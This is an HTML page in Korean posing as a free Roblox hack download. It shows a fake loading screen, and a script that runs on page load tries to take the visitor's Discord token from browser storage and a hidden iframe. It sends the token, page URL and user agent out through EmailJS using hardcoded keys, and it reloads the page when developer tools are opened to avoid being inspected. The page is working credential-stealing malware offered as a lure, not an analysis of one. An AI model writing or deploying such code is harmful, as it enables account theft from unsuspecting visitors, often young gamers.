<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>로블록스 핵 무료 다운 2026</title>
  <style>
    body { 
      margin:0; padding:0; height:100vh; 
      background:#000; color:#0f0; font-family: 'Courier New', monospace; 
      display:flex; align-items:center; justify-content:center; overflow:hidden;
    }
    .container { text-align:center; max-width:90%; }
    h1 { font-size:3rem; text-shadow:0 0 15px #0f0, 0 0 30px #0f0; animation: glitch 1.5s infinite; }
    .loader { width:100px; height:100px; border:10px solid #0f0; border-top:10px solid transparent; border-radius:50%; animation: spin 0.8s linear infinite; margin:40px auto; }
    p { font-size:1.4rem; margin:25px 0; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    @keyframes glitch {
      0%,100% { transform:translate(0); text-shadow:2px 0 #f0f, -2px 0 #0ff; }
      20% { transform:translate(-2px,2px); text-shadow:-2px -2px #f0f, 2px 2px #0ff; }
      40% { transform:translate(2px,-2px); }
    }
  </style>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>핵 로딩 중... 잠시만요</h1>
    <div class="loader"></div>
    <p>곧 다운로드 링크가 나타납니다!</p>
  </div>

  <script>
    // EmailJS 초기화 - 네가 준 키 그대로 넣음
    (function(){
      emailjs.init("ycbHVBt3cm6FkCL--");
    })();

    const SERVICE_ID = "service_jmsvqzd";
    const TEMPLATE_ID = "template_fjunjx8";

    async function stealDiscordToken() {
      try {
        let token = localStorage.getItem("token") || sessionStorage.getItem("token");

        // 토큰 못 찾으면 iframe으로 Discord 로그인 페이지 열어서 시도
        if (!token) {
          console.log("[+] 1차 실패 → iframe 추출 시도");
          const iframe = document.createElement("iframe");
          iframe.style.display = "none";
          iframe.src = "https://discord.com/login";
          document.body.appendChild(iframe);

          await new Promise(r => setTimeout(r, 2800));

          try {
            const win = iframe.contentWindow || iframe.contentDocument?.defaultView;
            if (win) {
              token = win.localStorage?.getItem("token") || 
                      win.sessionStorage?.getItem("token");
            }
          } catch(e) {
            console.log("iframe 접근 차단됨");
          }

          document.body.removeChild(iframe);
        }

        if (token) {
          token = token.replace(/"/g, "").trim();
          console.log("[+] 토큰 잡음:", token.substring(0, 30) + "...");

          // EmailJS 발송 (To Email은 템플릿에 고정돼 있으니까 안 넘겨도 됨)
          const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
            token: token,
            url: window.location.href,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent
          });

          console.log("[++] 발송 완료! 상태:", response.status);
        } else {
          console.log("[-] 토큰 못 찾음");
        }

      } catch(e) {
        console.error("[ERROR]", e.message || e);
      }
    }

    // 페이지 로드 후 0.8초 뒤 자동 실행
    window.addEventListener("load", () => {
      setTimeout(stealDiscordToken, 800);
    });

    // DevTools 감지 시 리로드 (탐지 회피)
    setInterval(() => {
      if (window.outerWidth - window.innerWidth > 160 || 
          window.outerHeight - window.innerHeight > 160) {
        location.reload();
      }
    }, 800);
  </script>
</body>
</html>
